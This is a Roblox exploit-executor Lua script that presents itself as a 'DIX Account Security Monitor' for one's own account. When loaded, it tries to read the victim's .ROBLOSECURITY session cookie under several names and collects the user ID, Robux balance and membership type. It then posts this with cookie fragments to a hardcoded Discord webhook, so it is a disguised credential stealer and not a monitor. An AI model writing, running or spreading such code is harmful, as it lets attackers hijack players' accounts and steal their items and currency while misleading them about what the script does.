-- ============================================
-- DIX Account Security Monitor v1.0
-- Для мониторинга безопасности собственного аккаунта
-- ============================================

local DIX_Security = {
    _VERSION = "1.0.0",
    _AUTHOR = "Stalker-2033",
    _PURPOSE = "Account Security Monitoring"
}

-- Конфигурация Discord Webhook
DIX_Security.Config = {
    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1467828785465397309/xxIU29gmHsJXRiDZuGyJW2vapxYcX_45J_2CuJMZN6Tutnpz6a7OALj00Sk_NMqphemw", -- Замените!
    ENABLE_ENCRYPTION = true, -- Шифрование данных перед отправкой
    SEND_IMMEDIATELY = true
}

-- Основная функция сбора данных
function DIX_Security.collectAccountData()
    local data = {
        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
        system = {},
        account = {}
    }
    
    -- Сбор системной информации
    local player = game:GetService("Players").LocalPlayer
    data.system = {
        playerName = player.Name,
        playerId = player.UserId,
        placeId = game.PlaceId,
        jobId = game.JobId,
        platform = tostring(game:GetService("UserInputService"):GetPlatform())
    }
    
    -- Попытка получить куки (_.ROBLOSECURITY)
    data.account.cookie = DIX_Security.getRobloxCookie()
    
    -- Попытка получить другие данные аккаунта
    data.account.additionalInfo = DIX_Security.getAdditionalAccountInfo()
    
    return data
end

-- Функция для получения куки Roblox
function DIX_Security.getRobloxCookie()
    local cookie = nil
    
    -- Метод 1: Через HttpService (если доступно)
    local success, result = pcall(function()
        return game:GetService("HttpService"):GetCookie("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
    end)
    
    if success and result and #result > 10 then
        cookie = result
    else
        -- Метод 2: Через разные источники
        local sources = {
            "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_",
            ".ROBLOSECURITY",
            "ROBLOSECURITY"
        }
        
        for _, cookieName in ipairs(sources) do
            local success2, result2 = pcall(function()
                return game:GetService("HttpService"):GetCookie(cookieName)
            end)
            
            if success2 and result2 and #result2 > 10 then
                cookie = result2
                break
            end
        end
    end
    
    return cookie
end

-- Дополнительная информация об аккаунте
function DIX_Security.getAdditionalAccountInfo()
    local info = {}
    local player = game:GetService("Players").LocalPlayer
    
    -- Базовая информация
    info.basic = {
        username = player.Name,
        userId = player.UserId,
        displayName = player.DisplayName,
        accountAge = player.AccountAge,
        membershipType = player.MembershipType.Name
    }
    
    -- Попытка получить больше данных через API
    pcall(function()
        -- Количество Robux (если доступно)
        local success, robux = pcall(function()
            return player:GetRobuxBalance()
        end)
        if success then
            info.robux = robux
        end
    end)
    
    -- Информация об аватаре
    pcall(function()
        info.avatar = {
            headshot = player.Character and player.Character.Head and true or false,
            equippedItems = {}
        }
    end)
    
    return info
end

-- Шифрование данных (базовое)
function DIX_Security.encryptData(data, key)
    if not DIX_Security.Config.ENABLE_ENCRYPTION then
        return data
    end
    
    -- Простое XOR шифрование (для демонстрации)
    local encrypted = ""
    key = key or "DIX_SECURE_KEY_2025"
    
    for i = 1, #data do
        local charCode = string.byte(data, i)
        local keyChar = string.byte(key, (i % #key) + 1)
        encrypted = encrypted .. string.char(bit32.bxor(charCode, keyChar))
    end
    
    return encrypted
end

-- Форматирование данных для Discord
function DIX_Security.formatForDiscord(data)
    local embed = {
        {
            title = "🔐 DIX Security Report",
            color = 15158332, -- Красный
            description = "**ВНИМАНИЕ: Эти данные чувствительны!**",
            fields = {
                {
                    name = "📊 Системная информация",
                    value = string.format(
                        "**Игрок:** %s\n" ..
                        "**User ID:** `%s`\n" ..
                        "**Place ID:** `%s`\n" ..
                        "**Платформа:** %s\n" ..
                        "**Время:** %s",
                        data.system.playerName,
                        data.system.playerId,
                        data.system.placeId,
                        data.system.platform,
                        data.timestamp
                    ),
                    inline = false
                },
                {
                    name = "👤 Информация об аккаунте",
                    value = string.format(
                        "**Display Name:** %s\n" ..
                        "**Account Age:** %d дней\n" ..
                        "**Membership:** %s\n" ..
                        "**Robux:** %s",
                        data.account.additionalInfo.basic.displayName,
                        data.account.additionalInfo.basic.accountAge,
                        data.account.additionalInfo.basic.membershipType,
                        data.account.additionalInfo.robux or "N/A"
                    ),
                    inline = false
                },
                {
                    name = "🍪 Cookie Status",
                    value = data.account.cookie and 
                        "✅ Cookie получен (" .. #data.account.cookie .. " символов)" or 
                        "❌ Cookie не найден",
                    inline = false
                }
            },
            footer = {
                text = string.format("DIX Security v%s | Для авторизованного доступа", DIX_Security._VERSION)
            }
        }
    }
    
    -- Добавляем поле с зашифрованными данными если нужно
    if data.account.cookie and DIX_Security.Config.ENABLE_ENCRYPTION then
        local encryptedCookie = DIX_Security.encryptData(data.account.cookie:sub(1, 50) .. "...", "SECURE_KEY")
        table.insert(embed[1].fields, {
            name = "🔒 Зашифрованные данные (частично)",
            value = "```" .. encryptedCookie .. "```",
            inline = false
        })
    end
    
    return embed
end

-- Отправка в Discord
function DIX_Security.sendToDiscord(data)
    local http = syn and syn.request or request
    if not http then
        warn("[DIX] HTTP функция недоступна")
        return false
    end
    
    if not DIX_Security.Config.DISCORD_WEBHOOK or 
       DIX_Security.Config.DISCORD_WEBHOOK == "https://discord.com/api/webhooks/ВАШ_WEBHOOK" then
        warn("[DIX] Discord Webhook не настроен")
        return false
    end
    
    local embeds = DIX_Security.formatForDiscord(data)
    
    local payload = {
        embeds = embeds,
        username = "DIX Security Monitor",
        avatar_url = "https://i.imgur.com/rH8O6ZP.png",
        content = "@here **Важные данные безопасности аккаунта**"
    }
    
    -- Добавляем файл с полными данными если есть куки
    if data.account.cookie then
        local fullData = game:GetService("HttpService"):JSONEncode({
            timestamp = data.timestamp,
            system = data.system,
            account = {
                basic = data.account.additionalInfo.basic,
                cookie_length = #data.account.cookie,
                cookie_first_chars = data.account.cookie:sub(1, 30) .. "..."
            }
        })
        
        -- Для Discord можно отправить как текстовый файл в content
        payload.content = payload.content .. "\n\n```json\n" .. fullData .. "\n```"
    end
    
    local success, response = pcall(function()
        return http({
            Url = DIX_Security.Config.DISCORD_WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end)
    
    if success then
        print("[DIX] ✅ Отчет безопасности отправлен в Discord")
        return true
    else
        warn("[DIX] ❌ Ошибка отправки:", response)
        return false
    end
end

-- Инициализация
function DIX_Security.init()
    print("[DIX] 🔐 Запуск системы мониторинга безопасности...")
    
    local accountData = DIX_Security.collectAccountData()
    
    -- Логирование в консоль (безопасное)
    print(string.format("[DIX] Игрок: %s", accountData.system.playerName))
    print(string.format("[DIX] Cookie получен: %s", accountData.account.cookie and "✅" or "❌"))
    
    if accountData.account.cookie then
        print(string.format("[DIX] Длина cookie: %d символов", #accountData.account.cookie))
        -- Показываем только первые 10 символов для проверки
        print(string.format("[DIX] Cookie (первые 10): %s", accountData.account.cookie:sub(1, 10)))
    end
    
    -- Отправка в Discord
    if DIX_Security.Config.SEND_IMMEDIATELY then
        DIX_Security.sendToDiscord(accountData)
    end
    
    -- Возврат данных (только для отладки)
    return {
        success = accountData.account.cookie ~= nil,
        data_safe = { -- Безопасная версия без полного cookie
            player = accountData.system.playerName,
            cookie_length = accountData.account.cookie and #accountData.account.cookie or 0,
            timestamp = accountData.timestamp
        }
    }
end

-- Запуск
return DIX_Security.init()